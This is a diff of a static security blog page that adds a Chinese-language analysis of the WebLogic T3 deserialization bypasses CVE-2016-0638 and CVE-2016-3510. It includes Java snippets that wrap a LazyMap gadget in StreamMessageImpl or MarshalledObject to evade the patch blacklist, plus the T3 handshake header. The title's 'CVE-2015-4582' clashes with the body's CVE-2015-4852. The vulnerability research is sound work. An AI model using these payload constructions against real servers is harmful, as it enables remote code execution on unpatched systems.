@@ -175,7 +175,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/28/CVE20154582/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/29/CVE20160638andCVE20163510/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -189,7 +189,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/01/28/CVE20154582/" class="post-title-link" itemprop="url">WebLogic基于T3协议的反序列化 CVE-2015-4582</a>
+            <a href="/2022/01/29/CVE20160638andCVE20163510/" class="post-title-link" itemprop="url">WebLogic基于T3协议的反序列化 CVE20163510 CVE20160638</a>
         </h2>
 
         <div class="post-meta">
@@ -200,7 +200,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-01-28 16:10:24 / Modified: 16:32:30" itemprop="dateCreated datePublished" datetime="2022-01-28T16:10:24+08:00">2022-01-28</time>
+              <time title="Created: 2022-01-29 01:26:26 / Modified: 01:28:10" itemprop="dateCreated datePublished" datetime="2022-01-29T01:26:26+08:00">2022-01-29</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -227,7 +227,129 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>WebLogic中的反序列化漏洞可以分为两种，第一种为基于T3协议的反序列化，第二种为基于XML的反序列化，下面表格为大概CVE分布，在基于T3的反序列化漏洞中，很多是基于CVE-2015-4582漏洞的一个相关绕过，而对CVE-2015-4582漏洞的绕过又大体应该分为两类，下面对CVE-2015-4582进行调试分析，为后面的绕过打下基础。</p>
+          <p>CVE-2016-0638 是前面分析的 CVE-2015-4852 的一个绕过，通过找到一个不在黑名单中的类，且这个类存在<code>readObject/readResolve/readExternal</code> 方法，并且恰好这些方法里面有一些数据进行反序列化操作，那么这时我们就可以把原生的序列化数据封装到这个类里面，通过调用反序列化对象重写的<code>readObject/readResolve/readExternal</code> 方法这一特点来反序列化封装在类里面的原生序列化数据。</p>
+<h2 id="修复环境搭建"><a href="#修复环境搭建" class="headerlink" title="修复环境搭建"></a>修复环境搭建</h2><p>因为这里的 CVE-2016-0638 是 CVE-2015-4852 的一个绕过，所以这里需要在前面那个 docker 环境中打上补丁，以此来分析 WebLogic 的补丁到底打到了那里。</p>
+<p>环境搭建参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p>
+<p>如果按照上面文章搭建报如下错误</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128202843340.png" alt="image-20220128202843340"></p>
+<p>则需要把<code>EJUM.jar/patch-catalog_22958.xml</code>这两个文件从<code>p20780171_1036_Generic</code>目录拷贝到<code>/u01/app/oracle/middleware/utils/bsu/cache_dir/</code>目录下</p>
+<p>补丁下载参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hmhhz/p/11422019.html">https://www.cnblogs.com/hmhhz/p/11422019.html</a></p>
+<h2 id="CVE-2015-4852的防御"><a href="#CVE-2015-4852的防御" class="headerlink" title="CVE-2015-4852的防御"></a>CVE-2015-4852的防御</h2><p>先来看下 WebLogic 对 CVE-2015-4852 反序列化漏洞的防御，在安装好补丁之后用前面的脚本打目标服务器，发现无法成功创建文件，把断点下在 <code>ServerChannelInputStream#resolveClass</code> 方法上，可以看到这里多了一个黑名单检查</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204003976.png" alt="image-20220128204003976"></p>
+<p>咋们跟进一下 <code>ClassFilter#isBlackListed</code> 方法，<code>ClassFilter</code> 这个类有静态代码块，那么先来看下静态代码块</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204124947.png" alt="image-20220128204124947"></p>
+<p>这里应该是判断有无设置一些参数为 true</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204655232.png" alt="image-20220128204655232"></p>
+<p>根据判断设置的参数情况来添加相应的类到黑名单里面，最终我这里的黑名单类为如下</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204934385.png" alt="image-20220128204934385"></p>
+<p>然后 <code>isBlackListed</code> 方法判断传入的类名是否存在于类黑名单中，如果存在则直接返回 true 了，如果不存在则截取包名，再判断包名是否存在类黑名单中，在这里的过滤的类黑名单中没有<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类在里面</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128205420340.png" alt="image-20220128205420340"></p>
+<p>虽然 <code>AnnotationInvocationHandler</code> 类不在类黑名单里面，但是一些Gadget所用到的类在黑名单里面，而在<code>AnnotationInvocationHandler</code> 类直接通过 <code>InboundMsgAbbrev#readObject</code> 进行反序列化的过程中会再次调用到 <code>ServerChannelInputStream#resolveClass</code> 方法来处理比如 <code>org.apache.commons.collections.map.LazyMap</code> 类，而这个类会被黑名单检测到 ，这样一来自然就被拦截了</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129011919745.png" alt="image-20220129011919745"></p>
+<p>除了这里有检测之外，<code>MsgAbbrevInputStream#resolveClass</code> 方法也存在检测，不过检测的手段都是一样的，就不再赘述。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128211420511.png" alt="image-20220128211420511"></p>
+<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>这篇的开头也说了其中的一种绕过思路了，就是找一个存在 <code>readObject/readResolve/readExternal</code> 方法的类，且这个类的这些方法里面又调用了 <code>ObjectInputStream#readObject</code> 方法来反序列化一些数据，我们只需要把真正的 payload 封装在类里面，这样就绕过了黑名单的检测。</p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>这里的绕过用到的是 <code>StreamMessageImpl</code> 类，这个类存在 <code>readExternal</code> 方法，且这个方法调用了 <code>ObjectInputStream#readObject</code>方法来反序列化从输入流中读取出来的数据。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129004852855.png" alt="image-20220129004852855"></p>
+<p>要让 <code>var3</code> 为1，  <code>var4</code> 为恶意序列化数据，这里通过重写 <code>StreamMessageImpl#writeExternal</code> 方法，在构造 payload 的项目创建 <code>weblogic.jms.common</code> 包，并增加两个属性和三个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] buffer;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] getDataBuffer() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.bdos != <span class="keyword">null</span> ? <span class="keyword">this</span>.bdos.getBuffer() : <span class="keyword">this</span>.buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getDataSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.bdos != <span class="keyword">null</span> ? <span class="keyword">this</span>.bdos.size() : <span class="keyword">this</span>.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setDataBuffer</span><span class="params">(<span class="keyword">byte</span>[] var1, <span class="keyword">int</span> var2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.buffer = var1;</span><br><span class="line">    <span class="keyword">this</span>.length = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重写 <code>writeExternal</code> 方法，手工写入值为1的 byte 数据和恶意的序列化数据，这样在调用到 <code>StreamMessageImpl#readExternal</code> 方法的时候就可以调用到 <code>readObject</code> 方法，并且 <code>var4</code> 为恶意的序列化数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput paramObjectOutput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.writeExternal(paramObjectOutput);</span><br><span class="line">    paramObjectOutput.writeByte(<span class="number">1</span>);</span><br><span class="line">    paramObjectOutput.writeInt(getDataSize());</span><br><span class="line">    paramObjectOutput.write(getDataBuffer());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造 payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) Collections01LazyMap.getObject();</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = SerWithUnSer.serialize(invocationHandler,<span class="keyword">false</span>);</span><br><span class="line">    StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl();</span><br><span class="line">    streamMessage.setDataBuffer(bytes,bytes.length);</span><br><span class="line">    <span class="keyword">return</span> streamMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对一些序列化的过程进行了封装，不过原理都是一样的。</p>
+<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>CVE-2016-3510 用到的是 <code>MarshalledObject#readResolve </code>方法，看一下这个方法的逻辑。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128225312859.png" alt="image-20220128225312859"></p>
+<p><code>objBytes</code> 属性是一个对象，对这个属性对象使用 <code>readObject</code> 方法，那么也就很明显了，把恶意对象封装到 <code>MarshalledObject</code> 类的 <code>objBytes</code> 属性中即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) Collections01LazyMap.getObject();</span><br><span class="line">    MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(invocationHandler);</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成序列化文件之后用前面的 cve-2015-4852 打就行</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a><br><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/28/CVE20154582/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ky0127">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/28/CVE20154582/" class="post-title-link" itemprop="url">WebLogic基于T3协议的反序列化 CVE-2015-4582</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-28 16:10:24" itemprop="dateCreated datePublished" datetime="2022-01-28T16:10:24+08:00">2022-01-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-01-29 01:42:25" itemprop="dateModified" datetime="2022-01-29T01:42:25+08:00">2022-01-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+
+
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>WebLogic中的反序列化漏洞可以分为两种，第一种为基于T3协议的反序列化，第二种为基于XML的反序列化，下面表格为大概CVE分布，在基于T3的反序列化漏洞中，很多是基于CVE-2015-4582漏洞的一个相关绕过，而对 CVE-2015-4582漏洞的绕过又大体应该分为两类，下面对CVE-2015-4582进行调试分析，为后面的绕过打下基础。</p>
 <table>
 <thead>
 <tr>
@@ -266,7 +388,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec  weblogic1036jdk7u21 ls /</span><br></pre></td></tr></table></figure>
 
 <h2 id="T3-协议"><a href="#T3-协议" class="headerlink" title="T3 协议"></a>T3 协议</h2><p>基于T3协议的反序列化漏洞，那么避无可避的就是要了解T3协议。T3协议是WebLogic特有的一个协议，用于传输RMI服务过程中产生的数据流。</p>
-<h3 id="T3-协议请求头"><a href="#T3-协议请求头" class="headerlink" title="T3 协议请求头"></a>T3 协议请求头</h3><p>T3协议在传输请求体之前，需要先发送一个数据包到目标服务器，这个数据包的内容基本固定，为 <code>t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n</code>，在t3后面的版本随意捏造就行，注意的是请求包头内容需要两个换行符结尾，而在后面的请求体中也是两个换行符结尾的。</p>
+<h3 id="T3-协议请求头"><a href="#T3-协议请求头" class="headerlink" title="T3 协议请求头"></a>T3 协议请求头</h3><p>T3协议在传输请求体之前，需要先发送一个数据包到目标服务器，这个数据包的内容基本固定，为<code>t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n</code>，在t3后面的版本随意捏造就行，注意的是请求包头内容需要两个换行符结尾，而在后面的请求体中也是两个换行符结尾的。</p>
 <p>这里使用wireshark捉数据包看一下，虚拟机网络换为Nat类型，因为不知道数据走的是哪一个接口，所以我这里把所有的接口数据都拦截了，在POC发送完第一个数据包的地方下断点，调试启动即可在wireshark捉到包</p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128151628684.png" alt="image-20220128151628684"></p>
 <p>追踪一下7001端口的数据，发现咋们发完第一个数据包之后，服务器回返回<code>HELO:</code>加上WebLogic真正的版本</p>
@@ -276,17 +398,17 @@
 <p>红框框着的是恶意序列化数据，下面调试代码来分析一下T3协议为什么会造成反序列化漏洞</p>
 <h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>配置好远程DEBUG，在<code>InboundMsgAbbrev#readObject</code>方法上下断点，用poc打过去IDEA会停在这个方法上</p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128154633456.png" alt="image-20220128154633456"></p>
-<p>WebLogic会使用<code>InboundMsgAbbrev#readObject</code>方法处理经过T3协议传递过来的反序列化数据，这里会调用<code>InboundMsgAbbrev.ServerChannelInputStream</code>内部类的<code>readObject</code>方法</p>
+<p>WebLogic会使用<code>InboundMsgAbbrev#readObject</code>方法处理经过T3协议传递过来的反序列化数据，这里会调用 <code>InboundMsgAbbrev.ServerChannelInputStream</code>内部类的<code>readObject</code>方法</p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128154907168.png" alt="image-20220128154907168"></p>
-<p>查看一下<code>ServerChannelInputStream</code>内部类，发现这个内部类继承了<code>ObjectInputStream</code>类,重写了<code>resolveClass</code>方法,但是没有重写<code>readObject</code>方法，那么调用<code>ServerChannelInputStream#readObject</code>方法就是调用 <code>ObjectInputStream#readObject</code>方法，也就是<code>WebLogic</code>使用了<code>ObjectInputStream#readObject</code>方法处理我们经过T3协议传递过来的反序列化数据</p>
+<p>查看一下<code>ServerChannelInputStream</code>内部类，发现这个内部类继承了<code>ObjectInputStream</code>类,重写了<code>resolveClass</code>方法,但是没有重写<code>readObject</code>方法，那么调用<code>ServerChannelInputStream#readObject</code>方法就是调用<code>ObjectInputStream#readObject</code>方法，也就是<code>WebLogic</code>使用了 <code>ObjectInputStream#readObject</code>方法处理我们经过T3协议传递过来的反序列化数据</p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128155148719.png" alt="image-20220128155148719"></p>
-<p>当然使用<code>ObjectInputStream#readObject</code>方法处理反序列化数据的过程中会调用到<code>ServerChannelInputStream#resolveClass</code>方法，这是在前面分析<code>ObjectInputStream#readObject</code>方法的时候了解到的，因为<code>ServerChannelInputStream#resolveClass</code>方法是反序列化过程中的必经之路，所以后续的防护也可以在这里进行，当然这个后面再谈。</p>
+<p>当然使用<code>ObjectInputStream#readObject</code>方法处理反序列化数据的过程中会调用<code>ServerChannelInputStream#resolveClass</code>方法，这是在前面分析<code>ObjectInputStream#readObject</code>方法的时候了解到的，因为<code>ServerChannelInputStream#resolveClass</code>方法是反序列化过程中的必经之路，所以后续的防护也可以在这里进行，当然这个后面再谈。</p>
 <p>那么现在漏洞产生的原因就很明显了，就是WebLogic在用<code>ServerChannelInputStream#readObject</code>方法处理T3协议传递过来的反序列化数据时调用到了<code>ObjectInputStream#readObject</code>方法进行处理反序列化数据，那么反序列化链的触发也就理所应当了。</p>
 <p>对于<code>ObjectInputStream#readObject</code>方法不了解的可以看一看前面的分析文章:<a target="_blank" rel="noopener" href="https://ky0103.github.io/2022/01/27/JavaReadObject0245/">https://ky0103.github.io/2022/01/27/JavaReadObject0245/</a></p>
 <h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>反序列化数据放到T3协议请求体的哪个位置才能触发Gadget呢？</p>
 <p>这里先放一张<code>z_zz_zzz</code>师傅的请求体数据格式</p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/2.png" alt="2"></p>
-<p>那么我们可以把恶意序列化数据替换到第二部分到第七部分的任一部分，或者把恶意序列化数据和第一部分混合，这两种方法都可行，前面的payload应该是把恶意序列化数据替换到了第三部分。</p>
+<p>那么我们可以把恶意序列化数据替换到第二部分到第七部分的任一部分，或者把恶意序列化数据和第一部分混合，这两种方法都可行，前面的 payload 应该是把恶意序列化数据替换到了第三部分。</p>
 <p>这里再贴一张<code>z_zz_zzz</code>师傅的图片，相当于是整个请求体的一个内容格式，可以看到序列化数据前面都是<code>f3 01 00 00</code></p>
 <p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/3.png" alt="2"></p>
 <h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>在出外网的情况下，可以做web代理或者负载均衡或者打补丁</p>
@@ -501,7 +623,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
